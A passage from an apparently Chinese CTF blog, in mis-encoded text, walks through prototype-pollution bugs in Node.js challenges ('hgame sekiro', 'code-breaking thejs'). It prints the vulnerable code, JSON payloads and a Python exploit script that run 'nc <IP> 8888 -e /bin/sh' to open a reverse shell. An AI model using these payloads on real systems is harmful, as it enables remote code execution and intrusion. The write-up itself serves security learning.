id="çœŸé¢˜"><a href="#çœŸé¢˜" class="headerlink" title="çœŸé¢˜"></a>çœŸé¢˜</h1><h2 id="hgame-sekiro"><a href="#hgame-sekiro" class="headerlink" title="hgame sekiro"></a>hgame sekiro</h2><p>å›å¤´æ¥çœ‹hgameä¸­sekiroè¿™é“é¢˜ï¼Œé¢˜ç›®ç»™å‡ºçš„å…³é”®æºç ä¸»è¦åœ¨ä¸€ä¸‹ä¸¤ä¸ªjsæ–‡ä»¶ä¸­<br>route/index.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"><span class="keyword">var</span> game = <span class="built_in">require</span>(<span class="string">'../utils/index'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> isObject = <span class="function"><span class="params">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class="built_in">Object</span>;</span><br><span class="line"><span class="keyword">const</span> merge = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> clone = <span class="function">(<span class="params">a</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> Game = <span class="keyword">new</span> game();</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">'index'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">'/action'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.session.sekiro) &#123;</span><br><span class="line">    res.end(<span class="string">"Session required."</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!req.session.sekiro.alive) &#123;</span><br><span class="line">    res.end(<span class="string">"You dead."</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> body = <span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(req.body));</span><br><span class="line">  <span class="keyword">var</span> copybody = clone(body)</span><br><span class="line">  <span class="keyword">if</span> (copybody.solution) &#123;</span><br><span class="line">    req.session.sekiro = Game.dealWithAttacks(req.session.sekiro, copybody.solution)</span><br><span class="line">  &#125;</span><br><span class="line">  res.end(<span class="string">"æäº¤æˆåŠŸ"</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">'/attack'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.session.sekiro) &#123;</span><br><span class="line">    res.end(<span class="string">"Session required."</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!req.session.sekiro.alive) &#123;</span><br><span class="line">    res.end(<span class="string">"You dead."</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  req.session.sekiro.attackInfo = Game.getAttackInfo()</span><br><span class="line">  res.end(req.session.sekiro.attackInfo.method)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">'/info'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span>(req.query.restart) != <span class="string">"undefined"</span> || !req.session.sekiro) &#123;</span><br><span class="line">    req.session.sekiro = &#123; <span class="string">"health"</span>: <span class="number">3000</span>, <span class="attr">posture</span>: <span class="number">0</span>, <span class="attr">alive</span>: <span class="literal">true</span> &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.json(req.session.sekiro);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure><p>ä»¥åŠutil/index.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">game</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.attacks = [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"method"</span>: <span class="string">"è¿ç»­ç å‡»"</span>,</span><br><span class="line">            <span class="string">"attack"</span>: <span class="number">1000</span>,</span><br><span class="line">            <span class="string">"additionalEffect"</span>: <span class="string">"sekiro.posture+=100"</span>,</span><br><span class="line">            <span class="string">"solution"</span>: <span class="string">"è¿ç»­æ ¼æŒ¡"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"method"</span>: <span class="string">"æ™®é€šæ”»å‡»"</span>,</span><br><span class="line">            <span class="string">"attack"</span>: <span class="number">500</span>,</span><br><span class="line">            <span class="string">"additionalEffect"</span>: <span class="string">"sekiro.posture+=50"</span>,</span><br><span class="line">            <span class="string">"solution"</span>: <span class="string">"æ ¼æŒ¡"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"method"</span>: <span class="string">"ä¸‹æ®µæ”»å‡»"</span>,</span><br><span class="line">            <span class="string">"attack"</span>: <span class="number">1000</span>,</span><br><span class="line">            <span class="string">"solution"</span>: <span class="string">"è·³è·ƒè¸©å¤´"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"method"</span>: <span class="string">"çªåˆºæ”»å‡»"</span>,</span><br><span class="line">            <span class="string">"attack"</span>: <span class="number">1000</span>,</span><br><span class="line">            <span class="string">"solution"</span>: <span class="string">"è¯†ç ´"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"method"</span>: <span class="string">"å·´ä¹‹é›·"</span>,</span><br><span class="line">            <span class="string">"attack"</span>: <span class="number">1000</span>,</span><br><span class="line">            <span class="string">"solution"</span>: <span class="string">"é›·å"</span></span><br><span class="line">        &#125;,</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">this</span>.getAttackInfo = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.attacks[<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="keyword">this</span>.attacks.length)]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.dealWithAttacks = <span class="function"><span class="keyword">function</span> (<span class="params">sekiro, solution</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (sekiro.attackInfo.solution !== solution) &#123;</span><br><span class="line">            sekiro.health -= sekiro.attackInfo.attack</span><br><span class="line">            <span class="keyword">if</span> (sekiro.attackInfo.additionalEffect) &#123;</span><br><span class="line">                <span class="keyword">var</span> fn = <span class="built_in">Function</span>(<span class="string">"sekiro"</span>, sekiro.attackInfo.additionalEffect + <span class="string">"\nreturn sekiro"</span>)</span><br><span class="line">                sekiro = fn(sekiro)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sekiro.posture = (sekiro.posture &lt;= <span class="number">500</span>) ? sekiro.posture : <span class="number">500</span></span><br><span class="line">        sekiro.health = (sekiro.health &gt; <span class="number">0</span>) ? sekiro.health : <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> (sekiro.posture == <span class="number">500</span> || sekiro.health == <span class="number">0</span>) &#123;</span><br><span class="line">            sekiro.alive = <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sekiro</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">module</span>.exports = game;</span><br></pre></td></tr></table></figure><p>å¾ˆå®¹æ˜“å‘ç°index.jsä¸­ï¼Œåœ¨<code>/action</code>è¿™ä¸ªè·¯ç”±é‡Œï¼Œæœ‰<code>merge(),clone()</code>å‡½æ•°çš„å‡ºç°ã€‚äºæ˜¯æˆ‘ä»¬è·Ÿè¿›ä¸‹ï¼Œå‘ç°è¦åˆ°<code>dealWithAttacks()</code>è¿™ä¸ªå‡½æ•°å»ï¼Œäºæ˜¯å†å®¡è®¡ä¸‹å…³é”®ä»£ç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (sekiro.attackInfo.additionalEffect) &#123;</span><br><span class="line">    <span class="keyword">var</span> fn = <span class="built_in">Function</span>(<span class="string">"sekiro"</span>, sekiro.attackInfo.additionalEffect + <span class="string">"\nreturn sekiro"</span>)</span><br><span class="line">    sekiro = fn(sekiro)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„<code>attackInfo.additionalEffect</code>å¦‚æœèƒ½è¢«æˆ‘ä»¬æ±¡æŸ“ï¼Œæ˜æ˜¾æ˜¯å¯ä»¥ç›´æ¥RCEçš„ã€‚é‚£ä¹ˆæˆ‘ä»¬è¦åšçš„å°±æ˜¯æ±¡æŸ“Objectç±»ï¼Œå½“é¢˜ç›®æ‰§è¡Œ<code>attackInfo.additionalEffect</code>æ‰¾ä¸åˆ°<code>additionalEffect</code>æ—¶ï¼Œå°±ä¼šç»§ç»­æ‰¾åˆ°åŸºç±»è¢«æ±¡æŸ“çš„è¿™ä¸€å±æ€§ï¼Œä»è€Œæ‰§è¡Œæˆ‘ä»¬çš„ä»£ç ã€‚</p><p>æ‰€ä»¥paylaodå¦‚ä¸‹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"solution"</span>:<span class="string">"1"</span>,<span class="string">"__proto__"</span>: &#123;<span class="string">"additionalEffect"</span>:<span class="string">"global.process.mainModule.constructor._load('child_process'). exec('nc vps-ip 8877 -e /bin/sh',function()&#123;&#125;);"</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘åœ¨ä½¿ç”¨bpä¼ å€¼æ—¶æ²¡å¼¹åˆ°shell,åæ¥åªèƒ½ç”¨pythonå†™è„šæœ¬äº†ï¼Œä¹Ÿè®¸æ˜¯JSONæ•°æ®çš„é—®é¢˜å§ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://sekiro.hgame.babelfish.ink/action'</span></span><br><span class="line">cookie=&#123;</span><br><span class="line">    <span class="string">'session'</span>:<span class="string">'s%3ACDDqh7q_XQ-rRAIB7W93PfE75p9oD7gS.UQuPEE0eikMrkIoAUaWJ3TFIibdRs72odZliCVcyzrk'</span></span><br><span class="line">&#125;</span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">'Content-Type'</span>:<span class="string">'application/json'</span></span><br><span class="line">&#125;</span><br><span class="line">payload=&#123;<span class="string">"solution"</span>:<span class="string">"1"</span>,<span class="string">"__proto__"</span>: &#123;<span class="string">"additionalEffect"</span>:<span class="string">"global.process.mainModule.constructor._load('child_process'). exec('nc 120.27.246.202 8888 -e /bin/sh',function()&#123;&#125;);"</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">res=requests.post(url,cookies=cookie,headers=headers,data=json.dumps(payload))</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨bashå¼¹shellè²Œä¼¼æ²¡æˆï¼Œå¯èƒ½æ˜¯æŸäº›å¥‡æ€ªçš„é—®é¢˜<br><img src="/2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/flag.PNG" class="lazyload" data-srcset="flag.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p><h2 id="code-breaking-thejs"><a href="#code-breaking-thejs" class="headerlink" title="code-breaking thejs"></a>code-breaking thejs</h2><p>å¼€å¤´æåˆ°äº†pç‰›çŸ¥è¯†æ˜Ÿçƒçš„è¿™é“é¢˜ï¼Œé‚£ä¹ˆç°åœ¨å†æ¥çœ‹çœ‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>)</span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">'lodash'</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">'express-session'</span>)</span><br><span class="line"><span class="keyword">const</span> randomize = <span class="built_in">require</span>(<span class="string">'randomatic'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line">app.use(bodyParser.urlencoded(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;)).use(bodyParser.json())</span><br><span class="line">app.use(<span class="string">'/static'</span>, express.static(<span class="string">'static'</span>))</span><br><span class="line">app.use(session(&#123;</span><br><span class="line">    name: <span class="string">'thejs.session'</span>,</span><br><span class="line">    secret: randomize(<span class="string">'aA0'</span>, <span class="number">16</span>),</span><br><span class="line">    resave: <span class="literal">false</span>,</span><br><span class="line">    saveUninitialized: <span class="literal">false</span></span><br><span class="line">&#125;))</span><br><span class="line">app.engine(<span class="string">'ejs'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">filePath, options, callback</span>) </span>&#123; <span class="comment">// define the template engine</span></span><br><span class="line">    fs.readFile(filePath, (err, content) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> callback(<span class="keyword">new</span> <span class="built_in">Error</span>(err))</span><br><span class="line">        <span class="keyword">let</span> compiled = lodash.template(content)</span><br><span class="line">        <span class="keyword">let</span> rendered = compiled(&#123;...options&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> callback(<span class="literal">null</span>, rendered)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">app.set(<span class="string">'views'</span>, <span class="string">'./views'</span>)</span><br><span class="line">app.set(<span class="string">'view engine'</span>, <span class="string">'ejs'</span>)</span><br><span class="line"></span><br><span class="line">app.all(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> data = req.session.data || &#123;<span class="attr">language</span>: [], <span class="attr">category</span>: []&#125;</span><br><span class="line">    <span class="keyword">if</span> (req.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        data = lodash.merge(data, req.body)</span><br><span class="line">        req.session.data = data</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    res.render(<span class="string">'index'</span>, &#123;</span><br><span class="line">        language: data.language, </span><br><span class="line">        category: data.category</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, () =&gt; <span class="built_in">console</span>.log(<span class="string">`Example app listening on port 3000!`</span>))</span><br></pre></td></tr></table></figure><p>æ¼æ´ç‚¹éå¸¸æ¸…æ™°ï¼Œå°±æ˜¯ä¸€ä¸ªPOSTå¤„ç”¨åˆ°äº†merge,æ˜¾ç„¶å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´ã€‚é‚£ä¹ˆå…³é”®å‡½æ•°éœ€è¦å»çœ‹çœ‹ï¼Œæ‰€ä»¥éœ€è¦å‚è€ƒlodashçš„ä»£ç ï¼ˆlodashæ˜¯ä¸€ä¸ªè¾…åŠ©åŠŸèƒ½é›†ï¼Œè¿™é‡Œä¸»è¦ç”¨åˆ°çš„è¿˜æ˜¯<code>lodash.merge</code>å’Œ<code>lodash.template</code>ï¼‰å¦‚æœå»å®¡è®¡æºç ï¼Œä¼šå‘ç°è¿™æ ·ä¸€ä¸ªå±æ€§<a href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165" target="_blank" rel="noopener">https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165</a>åŠå¯¹åº”æºç ï¼Œå’Œåé¢çš„è°ƒç”¨ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sourceURL = <span class="string">'sourceURL'</span> <span class="keyword">in</span> options ? <span class="string">'//# sourceURL='</span> + options.sourceURL + <span class="string">'\n'</span> : <span class="string">''</span>;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">var</span> result = attempt(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Function</span>(importsKeys, sourceURL + <span class="string">'return '</span> + source)</span><br><span class="line">  .apply(<span class="literal">undefined</span>, importsValues);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>å¼€å§‹<code>sourceURL</code>æ˜¯ç©ºå€¼ï¼Œä½†æ˜¯åé¢å®ƒä½œä¸ºnew Functionçš„ç¬¬äºŒä¸ªå‚æ•°ä¸­ï¼Œé€ æˆä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ã€‚<br>æ‰€ä»¥payloadå¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"__proto__"</span>:&#123;<span class="string">"sourceURL"</span>:<span class="string">"\u000aglobal.process.mainModule.constructor._load('child_process').exec('nc 120.27.246.202 8888 -e /bin/sh',function()&#123;&#125;);"</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/7.PNG" class="lazyload" data-srcset="7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="payload"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ­¤å¤„çš„<code>/u000a</code>å¿…ä¸å¯å°‘,è¿™æ—¶jsonä¸­çš„æ¢è¡Œã€‚å¹¶ä¸”ä¸€å®šè¦æŠŠ<code>Content-Type</code>å¿…é¡»è®¾ç½®æˆ<code>application/json</code>ã€‚å¦åˆ™<code>__proto__</code>ä¼šè¢«å¤„ç†æˆå­—ç¬¦ä¸²ã€‚<br>è¿™é‡ŒåŒæ ·ä½¿ç”¨è·Ÿhgameé‚£é“é¢˜ä¸€æ ·çš„å¼¹shellæ‰‹æ®µã€‚å¯ä»¥æ‹¿åˆ°shell<br>åŒæ—¶å› ä¸ºä¸çŸ¥é“æ–‡ä»¶åï¼Œä½¿ç”¨<code>cat /fl*</code>æ¥æ¨¡ç³Šå¤„ç†ã€‚<br><img src="/2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/flag1.PNG" class="lazyload" data-srcset="flag1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"><br>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œpç‰›å¯¹æ­¤é¢˜çš„payloadé¢å¤–å¸¦äº†ä¸€ä¸ªforå¾ªç¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for (var a in&#123;&#125;) &#123;delete Object.prototype[a]&#125;</span><br></pre></td></tr></table></figure><p>åˆ æ‰æ±¡æŸ“çš„åŸå‹ã€‚è¿™æ—¶å› ä¸ºåŸå‹æ±¡æŸ“è¿™ä¸€æ¼æ´é™¤éæ•´ä¸ªç¨‹åºé‡å¯ï¼Œå¦åˆ™æ‰€æœ‰çš„å¯¹è±¡éƒ½ä¼šè¢«æ±¡æŸ“ä¸å½±å“ã€‚è¿™æ ·åœ¨awdç­‰ç­‰æ¯”èµ›ä¸­ä¸€æ—¦ä½ æ‹¿åˆ°flag,å°±æœ‰å¯èƒ½è¢«åˆ«äººç›´æ¥è®¿é—®åˆ°ã€‚</p><p>æ€»ç»“ä¸‹ï¼š<br>1.åŸå‹é“¾æ±¡æŸ“å±äºå‰ç«¯æ¼æ´åº”ç”¨ï¼ŒåŸºæœ¬ä¸Šéœ€è¦æºç å®¡è®¡åŠŸåŠ›æ¥è¿›è¡Œè§£å†³ï¼›æ‰¾åˆ°<code>merge(),clone()</code>åªæ˜¯ç¡®å®šæ¼æ´çš„å¼€å§‹<br>2.è¿›è¡Œå®¡è®¡éœ€è¦ä»¥è¾¾æˆRCEä¸ºä¸»è¦ç›®çš„ã€‚é€šå¸¸<code>exec, return</code>ç­‰ç­‰éƒ½æ˜¯å€¼å¾—æ³¨æ„çš„å…³é”®å­—ã€‚<br>3.é¢˜ç›®åŸºæœ¬æ˜¯ä»¥å¼¹shellä¸ºæœ€ç»ˆç›®çš„ã€‚ç›®å‰æ¥çœ‹å¾ˆå¤šNode.jsä¼ ç»Ÿå¼¹shellæ–¹å¼å¹¶ä¸é€‚ç”¨.wget,curl,ä»¥åŠæˆ‘ä¸¤é“é¢˜éƒ½ç”¨åˆ°çš„ncæ¯”è¾ƒé€‚ç”¨ã€‚</p><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://www.anquanke.com/post/id/176884#h3-5" target="_blank" rel="noopener">https://www.anquanke.com/post/id/176884#h3-5</a><br><a href="https://xz.aliyun.com/t/2802" target="_blank" rel="noopener">https://xz.aliyun.com/t/2802</a><br><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å®‰æ´µæ¯2019-webå¤ç°</title>
      <link href="2020/02/10/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-web%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/02/10/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-web%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>å‘ç°buuojä¸Šå®‰æ´µ2019çš„é¢˜ç›®æœ‰ç°æˆçš„ï¼Œä¸ç”¨åœ¨vpsä¸Šæ­äº†(ç¬¬ä¸€é¢˜é™¤å¤–ï¼Œæ­å¥½æ‰å‘ç°â€¦â€¦)ï¼Œåˆšå¥½åšåšã€‚</p><a id="more"></a><h1 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h1><p>è¿›å»åurlæœ‰ä¸¤ä¸ªæ˜æ˜¾å‚æ•°ï¼Œç¬¬ä¸€ä¸ªç±»ä¼¼äºbase64ç¼–ç ï¼Œç¬¬äºŒä¸ªç”±å‚æ•°åçŸ¥é“å¯èƒ½æ˜¯rceå‚æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;</span><br></pre></td></tr></table></figure><p>å…ˆè§£ç å‰é¢ä¸€ä¸ªå‚æ•°çš„å€¼ï¼Œå‘ç°base64è§£äº†ä¸¤æ¬¡åå¾—åˆ°ä¸€ä¸²æ•°å­—ï¼Œçœ‹èµ·æ¥åƒåå…­è¿›åˆ¶å­—ç¬¦ã€‚å°è¯•16è¿›åˆ¶è§£ç åå¾—åˆ°<code>555.pnf0</code>è¯å®äº†åŠ å¯†æ–¹å¼ã€‚<br>åŠ ä¸Šå›¾ç‰‡çš„å›æ˜¾æœ‰base64çš„å†…å®¹ï¼Œå¯çŸ¥imgå‚æ•°ç”¨äºæ–‡ä»¶åŒ…å«ï¼Œé‚£ä¹ˆåŒ…å«ä¸‹index.phpå§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 